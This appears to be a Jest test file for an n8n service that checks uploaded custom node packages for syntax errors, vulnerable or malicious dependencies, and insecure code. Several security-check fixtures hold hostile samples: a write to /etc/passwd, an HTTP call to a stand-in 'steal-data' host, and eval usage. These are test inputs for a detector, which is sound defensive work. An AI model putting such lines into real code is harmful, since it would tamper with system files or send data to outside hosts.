import { Logger } from '@n8n/backend-common';
import { GlobalConfig } from '@n8n/config';
import { BadRequestError } from '@/errors/response-errors/bad-request.error';
import { InternalServerError } from '@/errors/response-errors/internal-server.error';
import {
	CustomNodeValidationService,
	type ValidationOptions,
	type SecurityCheckResult,
	type SyntaxValidationResult,
	type DependencyValidationResult,
	type SecurityViolation,
} from '@/services/custom-node-validation.service';
import { mock } from 'jest-mock-extended';
import { promises as fs } from 'fs';
import { spawn } from 'child_process';
import type { ChildProcess } from 'child_process';
import { EventEmitter } from 'events';

// Mock file system operations
jest.mock('fs', () => ({
	promises: {
		readFile: jest.fn(),
		writeFile: jest.fn(),
		readdir: jest.fn(),
		stat: jest.fn(),
		mkdir: jest.fn(),
		rmdir: jest.fn(),
		access: jest.fn(),
	},
}));

// Mock child_process
jest.mock('child_process', () => ({
	spawn: jest.fn(),
}));

// Mock crypto
jest.mock('crypto', () => ({
	createHash: jest.fn(() => ({
		update: jest.fn().mockReturnThis(),
		digest: jest.fn(() => 'mock-hash'),
	})),
}));

// Mock path operations
jest.mock('path', () => ({
	join: jest.fn((...args) => args.join('/')),
	extname: jest.fn((path) => {
		const parts = path.split('.');
		return parts.length > 1 ? `.${parts[parts.length - 1]}` : '';
	}),
	basename: jest.fn((path) => path.split('/').pop()),
	dirname: jest.fn((path) => path.split('/').slice(0, -1).join('/')),
}));

// Mock os
jest.mock('os', () => ({
	tmpdir: jest.fn(() => '/tmp'),
}));

// Mock extraction utilities (AdmZip, tar, etc.)
jest.mock('adm-zip', () => {
	return jest.fn().mockImplementation(() => ({
		extractAllTo: jest.fn(),
		getEntries: jest.fn(() => [
			{ entryName: 'index.js', isDirectory: false },
			{ entryName: 'package.json', isDirectory: false },
		]),
	}));
});

describe('CustomNodeValidationService', () => {
	let service: CustomNodeValidationService;
	let mockLogger: jest.Mocked<Logger>;
	let mockGlobalConfig: jest.Mocked<GlobalConfig>;

	const mockValidationOptions: ValidationOptions = {
		validateSyntax: true,
		validateDependencies: true,
		validateSecurity: true,
		runTests: false,
		strictMode: true,
		maxComplexity: 100,
	};

	beforeEach(() => {
		jest.clearAllMocks();

		mockLogger = mock<Logger>();
		mockGlobalConfig = mock<GlobalConfig>({
			validation: {
				maxFileSize: 10 * 1024 * 1024,
				allowedNodeTypes: ['TestNode', 'UtilityNode'],
				securityChecks: {
					enabled: true,
					strictMode: true,
				},
			},
		});

		service = new CustomNodeValidationService(mockLogger, mockGlobalConfig);
	});

	describe('validateNode', () => {
		const mockFilePath = '/tmp/test-node.zip';

		it('should validate node successfully with all checks passing', async () => {
			const mockSyntaxResult: SyntaxValidationResult = {
				valid: true,
				errors: [],
				warnings: [],
			};

			const mockDependencyResult: DependencyValidationResult = {
				valid: true,
				dependencies: [
					{
						name: 'lodash',
						version: '4.17.21',
						license: 'MIT',
						deprecated: false,
						security: { vulnerabilities: 0, advisories: [] },
					},
				],
				vulnerabilities: [],
				maliciousPackages: [],
			};

			const mockSecurityResult: SecurityCheckResult = {
				passed: true,
				violations: [],
				score: 95,
			};

			// Mock file extraction and validation methods
			jest.spyOn(service as any, 'extractAndValidateStructure').mockResolvedValue({
				extractedPath: '/tmp/extracted',
				files: ['index.js', 'package.json'],
			});
			jest.spyOn(service as any, 'validateSyntax').mockResolvedValue(mockSyntaxResult);
			jest.spyOn(service as any, 'validateDependencies').mockResolvedValue(mockDependencyResult);
			jest.spyOn(service as any, 'performSecurityChecks').mockResolvedValue(mockSecurityResult);
			jest.spyOn(service as any, 'cleanup').mockResolvedValue(undefined);

			const result = await service.validateNode(mockFilePath, mockValidationOptions);

			expect(result).toEqual({
				syntax: true,
				dependencies: true,
				security: true,
				tests: false, // Not run
				warnings: [],
				errors: [],
			});
		});

		it('should report validation failures correctly', async () => {
			const mockSyntaxResult: SyntaxValidationResult = {
				valid: false,
				errors: [
					{
						message: 'Unexpected token',
						line: 5,
						column: 10,
						type: 'SyntaxError',
					},
				],
				warnings: [],
			};

			const mockSecurityResult: SecurityCheckResult = {
				passed: false,
				violations: [
					{
						type: 'high',
						rule: 'no-eval',
						message: 'Use of eval() is dangerous',
						line: 15,
						column: 5,
						suggestion: 'Use safer alternatives',
					},
				],
				score: 45,
			};

			jest.spyOn(service as any, 'extractAndValidateStructure').mockResolvedValue({
				extractedPath: '/tmp/extracted',
				files: ['index.js'],
			});
			jest.spyOn(service as any, 'validateSyntax').mockResolvedValue(mockSyntaxResult);
			jest.spyOn(service as any, 'validateDependencies').mockResolvedValue({
				valid: true,
				dependencies: [],
				vulnerabilities: [],
				maliciousPackages: [],
			});
			jest.spyOn(service as any, 'performSecurityChecks').mockResolvedValue(mockSecurityResult);
			jest.spyOn(service as any, 'cleanup').mockResolvedValue(undefined);

			const result = await service.validateNode(mockFilePath, mockValidationOptions);

			expect(result).toEqual({
				syntax: false,
				dependencies: true,
				security: false,
				tests: false,
				warnings: [],
				errors: ['Unexpected token', 'Use of eval() is dangerous'],
			});
		});

		it('should skip disabled validation checks', async () => {
			const limitedOptions: ValidationOptions = {
				validateSyntax: true,
				validateDependencies: false,
				validateSecurity: false,
				runTests: false,
			};

			jest.spyOn(service as any, 'extractAndValidateStructure').mockResolvedValue({
				extractedPath: '/tmp/extracted',
				files: ['index.js'],
			});
			jest.spyOn(service as any, 'validateSyntax').mockResolvedValue({
				valid: true,
				errors: [],
				warnings: [],
			});
			const dependencySpy = jest.spyOn(service as any, 'validateDependencies');
			const securitySpy = jest.spyOn(service as any, 'performSecurityChecks');
			jest.spyOn(service as any, 'cleanup').mockResolvedValue(undefined);

			const result = await service.validateNode(mockFilePath, limitedOptions);

			expect(dependencySpy).not.toHaveBeenCalled();
			expect(securitySpy).not.toHaveBeenCalled();
			expect(result.dependencies).toBe(true); // Default to true when skipped
			expect(result.security).toBe(true); // Default to true when skipped
		});

		it('should handle file extraction failures', async () => {
			jest
				.spyOn(service as any, 'extractAndValidateStructure')
				.mockRejectedValue(new Error('Invalid archive format'));

			await expect(service.validateNode(mockFilePath, mockValidationOptions)).rejects.toThrow(
				BadRequestError,
			);
		});
	});

	describe('validateSyntax', () => {
		it('should validate JavaScript syntax successfully', async () => {
			const validJSCode = `
				class TestNode {
					constructor() {
						this.description = {
							displayName: 'Test Node',
							name: 'testNode',
							group: ['transform']
						};
					}
					
					async execute(items) {
						return items.map(item => ({
							...item,
							processed: true
						}));
					}
				}
				module.exports = { TestNode };
			`;

			(fs.readFile as jest.Mock).mockResolvedValue(validJSCode);
			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);

			const result = await (service as any).validateSyntax('/tmp/extracted');

			expect(result.valid).toBe(true);
			expect(result.errors).toHaveLength(0);
		});

		it('should detect JavaScript syntax errors', async () => {
			const invalidJSCode = `
				class TestNode {
					constructor() {
						this.description = {
							displayName: 'Test Node',
							name: 'testNode'
							group: ['transform'] // Missing comma
						};
					}
					
					async execute(items {  // Missing closing parenthesis
						return items;
					}
				}
			`;

			(fs.readFile as jest.Mock).mockResolvedValue(invalidJSCode);
			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);

			const result = await (service as any).validateSyntax('/tmp/extracted');

			expect(result.valid).toBe(false);
			expect(result.errors.length).toBeGreaterThan(0);
		});

		it('should validate TypeScript syntax successfully', async () => {
			const validTSCode = `
				interface INodeType {
					description: NodeTypeDescription;
					execute(this: IExecuteFunctions): Promise<INodeExecutionData[][]>;
				}
				
				class TestNode implements INodeType {
					description: NodeTypeDescription = {
						displayName: 'Test Node',
						name: 'testNode',
						group: ['transform']
					};
					
					async execute(this: IExecuteFunctions): Promise<INodeExecutionData[][]> {
						const items = this.getInputData();
						return [items];
					}
				}
			`;

			(fs.readFile as jest.Mock).mockResolvedValue(validTSCode);
			(fs.readdir as jest.Mock).mockResolvedValue(['index.ts']);

			const result = await (service as any).validateSyntax('/tmp/extracted');

			expect(result.valid).toBe(true);
		});

		it('should handle missing required files', async () => {
			(fs.readdir as jest.Mock).mockResolvedValue(['package.json']); // No JS/TS files

			const result = await (service as any).validateSyntax('/tmp/extracted');

			expect(result.valid).toBe(false);
			expect(result.errors).toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						message: expect.stringContaining('No executable files found'),
					}),
				]),
			);
		});
	});

	describe('validateDependencies', () => {
		it('should validate dependencies successfully', async () => {
			const mockPackageJson = {
				name: 'test-node',
				version: '1.0.0',
				dependencies: {
					lodash: '^4.17.21',
					axios: '^1.0.0',
				},
				devDependencies: {
					'@types/node': '^18.0.0',
				},
			};

			(fs.readFile as jest.Mock).mockResolvedValue(JSON.stringify(mockPackageJson));

			// Mock npm audit command
			const mockProcess = new EventEmitter() as ChildProcess;
			(spawn as jest.Mock).mockReturnValue(mockProcess);

			// Simulate npm audit success
			setTimeout(() => {
				mockProcess.emit('close', 0);
			}, 10);

			const result = await (service as any).validateDependencies('/tmp/extracted');

			expect(result.valid).toBe(true);
			expect(result.dependencies).toHaveLength(2);
			expect(result.vulnerabilities).toHaveLength(0);
		});

		it('should detect vulnerable dependencies', async () => {
			const mockPackageJson = {
				name: 'test-node',
				version: '1.0.0',
				dependencies: {
					'vulnerable-package': '1.0.0',
				},
			};

			(fs.readFile as jest.Mock).mockResolvedValue(JSON.stringify(mockPackageJson));

			const mockProcess = new EventEmitter() as ChildProcess & {
				stdout: EventEmitter;
				stderr: EventEmitter;
			};
			mockProcess.stdout = new EventEmitter();
			mockProcess.stderr = new EventEmitter();
			(spawn as jest.Mock).mockReturnValue(mockProcess);

			const mockAuditOutput = {
				vulnerabilities: {
					'vulnerable-package': {
						severity: 'high',
						title: 'Security vulnerability',
						overview: 'Package has known security issues',
						recommendation: 'Update to latest version',
					},
				},
			};

			setTimeout(() => {
				mockProcess.stdout.emit('data', JSON.stringify(mockAuditOutput));
				mockProcess.emit('close', 1); // Exit with error code
			}, 10);

			const result = await (service as any).validateDependencies('/tmp/extracted');

			expect(result.valid).toBe(false);
			expect(result.vulnerabilities.length).toBeGreaterThan(0);
		});

		it('should detect malicious packages', async () => {
			const mockPackageJson = {
				name: 'test-node',
				version: '1.0.0',
				dependencies: {
					'suspicious-package': '1.0.0',
				},
			};

			// Mock malicious package detection
			jest
				.spyOn(service as any, 'checkForMaliciousPackages')
				.mockResolvedValue(['suspicious-package']);

			(fs.readFile as jest.Mock).mockResolvedValue(JSON.stringify(mockPackageJson));

			const result = await (service as any).validateDependencies('/tmp/extracted');

			expect(result.valid).toBe(false);
			expect(result.maliciousPackages).toContain('suspicious-package');
		});

		it('should handle missing package.json', async () => {
			(fs.readFile as jest.Mock).mockRejectedValue(new Error('File not found'));

			const result = await (service as any).validateDependencies('/tmp/extracted');

			expect(result.valid).toBe(false);
			expect(result.dependencies).toHaveLength(0);
		});
	});

	describe('performSecurityChecks', () => {
		it('should pass security checks for safe code', async () => {
			const safeCode = `
				class TestNode {
					async execute(items) {
						return items.map(item => ({
							...item,
							timestamp: new Date().toISOString()
						}));
					}
				}
			`;

			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);
			(fs.readFile as jest.Mock).mockResolvedValue(safeCode);

			const result = await (service as any).performSecurityChecks('/tmp/extracted');

			expect(result.passed).toBe(true);
			expect(result.violations).toHaveLength(0);
			expect(result.score).toBeGreaterThan(90);
		});

		it('should detect dangerous function usage', async () => {
			const dangerousCode = `
				class TestNode {
					async execute(items) {
						const result = eval('2 + 2'); // Dangerous eval usage
						setTimeout(() => {
							process.exit(1); // Dangerous process.exit
						}, 1000);
						return items;
					}
				}
			`;

			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);
			(fs.readFile as jest.Mock).mockResolvedValue(dangerousCode);

			const result = await (service as any).performSecurityChecks('/tmp/extracted');

			expect(result.passed).toBe(false);
			expect(result.violations.length).toBeGreaterThan(0);
			expect(result.violations).toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						type: 'critical',
						rule: expect.stringContaining('eval'),
					}),
				]),
			);
			expect(result.score).toBeLessThan(50);
		});

		it('should detect file system access attempts', async () => {
			const fileSystemCode = `
				const fs = require('fs');
				class TestNode {
					async execute(items) {
						fs.writeFileSync('/etc/passwd', 'malicious content'); // File system access
						return items;
					}
				}
			`;

			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);
			(fs.readFile as jest.Mock).mockResolvedValue(fileSystemCode);

			const result = await (service as any).performSecurityChecks('/tmp/extracted');

			expect(result.passed).toBe(false);
			expect(result.violations).toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						type: 'high',
						rule: expect.stringContaining('file-system'),
					}),
				]),
			);
		});

		it('should detect network request attempts', async () => {
			const networkCode = `
				const http = require('http');
				class TestNode {
					async execute(items) {
						http.get('http://malicious-site.com/steal-data'); // Network request
						return items;
					}
				}
			`;

			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);
			(fs.readFile as jest.Mock).mockResolvedValue(networkCode);

			const result = await (service as any).performSecurityChecks('/tmp/extracted');

			expect(result.passed).toBe(false);
			expect(result.violations).toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						rule: expect.stringContaining('network'),
					}),
				]),
			);
		});

		it('should calculate security score based on violations', async () => {
			const codeWithMinorIssues = `
				class TestNode {
					async execute(items) {
						console.log('Debug info'); // Minor: console usage
						return items;
					}
				}
			`;

			(fs.readdir as jest.Mock).mockResolvedValue(['index.js']);
			(fs.readFile as jest.Mock).mockResolvedValue(codeWithMinorIssues);

			const result = await (service as any).performSecurityChecks('/tmp/extracted');

			// Should have minor violations but still pass
			expect(result.violations.length).toBeGreaterThan(0);
			expect(result.score).toBeGreaterThan(80);
			expect(result.score).toBeLessThan(100);
		});
	});

	describe('runTests', () => {
		it('should run tests successfully', async () => {
			const mockProcess = new EventEmitter() as ChildProcess & {
				stdout: EventEmitter;
				stderr: EventEmitter;
			};
			mockProcess.stdout = new EventEmitter();
			mockProcess.stderr = new EventEmitter();
			(spawn as jest.Mock).mockReturnValue(mockProcess);

			const testOutput = `
				Test Suites: 2 passed, 2 total
				Tests:       5 passed, 5 total
				Snapshots:   0 total
				Time:        2.5 s
			`;

			setTimeout(() => {
				mockProcess.stdout.emit('data', testOutput);
				mockProcess.emit('close', 0);
			}, 10);

			const result = await (service as any).runTests('/tmp/extracted');

			expect(result).toEqual({
				passed: true,
				testCount: 5,
				passedCount: 5,
				failedCount: 0,
				coverage: expect.any(Number),
				duration: expect.any(Number),
				output: expect.stringContaining('5 passed'),
			});
		});

		it('should handle test failures', async () => {
			const mockProcess = new EventEmitter() as ChildProcess & {
				stdout: EventEmitter;
				stderr: EventEmitter;
			};
			mockProcess.stdout = new EventEmitter();
			mockProcess.stderr = new EventEmitter();
			(spawn as jest.Mock).mockReturnValue(mockProcess);

			const testOutput = `
				Test Suites: 1 failed, 1 passed, 2 total
				Tests:       2 failed, 3 passed, 5 total
				Snapshots:   0 total
				Time:        2.5 s
			`;

			setTimeout(() => {
				mockProcess.stdout.emit('data', testOutput);
				mockProcess.emit('close', 1); // Exit with failure
			}, 10);

			const result = await (service as any).runTests('/tmp/extracted');

			expect(result).toEqual({
				passed: false,
				testCount: 5,
				passedCount: 3,
				failedCount: 2,
				coverage: expect.any(Number),
				duration: expect.any(Number),
				output: expect.stringContaining('2 failed'),
			});
		});

		it('should handle missing test configuration', async () => {
			(fs.readFile as jest.Mock).mockRejectedValue(new Error('package.json not found'));

			const result = await (service as any).runTests('/tmp/extracted');

			expect(result).toEqual({
				passed: false,
				testCount: 0,
				passedCount: 0,
				failedCount: 0,
				coverage: 0,
				duration: 0,
				output: 'No test configuration found',
			});
		});
	});

	describe('private helper methods', () => {
		it('should extract and validate file structure correctly', async () => {
			const AdmZip = require('adm-zip');
			const mockZip = new AdmZip();

			jest.spyOn(service as any, 'cleanup').mockResolvedValue(undefined);

			const result = await (service as any).extractAndValidateStructure('/tmp/test.zip');

			expect(result).toEqual({
				extractedPath: expect.stringContaining('/tmp'),
				files: ['index.js', 'package.json'],
			});
		});

		it('should detect malicious packages correctly', async () => {
			const maliciousPackages = ['evil-package', 'malicious-lib'];

			// Mock malicious package database/API
			jest.spyOn(global, 'fetch').mockResolvedValue({
				ok: true,
				json: () => Promise.resolve({ maliciousPackages }),
			} as Response);

			const result = await (service as any).checkForMaliciousPackages([
				'lodash',
				'evil-package',
				'axios',
			]);

			expect(result).toContain('evil-package');
			expect(result).not.toContain('lodash');
		});

		it('should cleanup temporary files', async () => {
			await (service as any).cleanup('/tmp/extracted-node');

			expect(mockLogger.debug).toHaveBeenCalledWith('Cleaning up temporary files', {
				path: '/tmp/extracted-node',
			});
		});
	});

	describe('error handling', () => {
		it('should handle validation timeout', async () => {
			jest.spyOn(service as any, 'extractAndValidateStructure').mockImplementation(
				() => new Promise(() => {}), // Never resolves
			);

			// Mock timeout
			jest.useFakeTimers();
			const validationPromise = service.validateNode('/tmp/test.zip', mockValidationOptions);

			jest.advanceTimersByTime(30000); // 30 seconds

			await expect(validationPromise).rejects.toThrow(InternalServerError);

			jest.useRealTimers();
		});

		it('should handle corrupted archive files', async () => {
			jest
				.spyOn(service as any, 'extractAndValidateStructure')
				.mockRejectedValue(new Error('Invalid or corrupted archive'));

			await expect(
				service.validateNode('/tmp/corrupted.zip', mockValidationOptions),
			).rejects.toThrow(BadRequestError);
		});

		it('should handle permission errors during extraction', async () => {
			jest
				.spyOn(service as any, 'extractAndValidateStructure')
				.mockRejectedValue(new Error('Permission denied'));

			await expect(service.validateNode('/tmp/test.zip', mockValidationOptions)).rejects.toThrow(
				InternalServerError,
			);
		});
	});
});
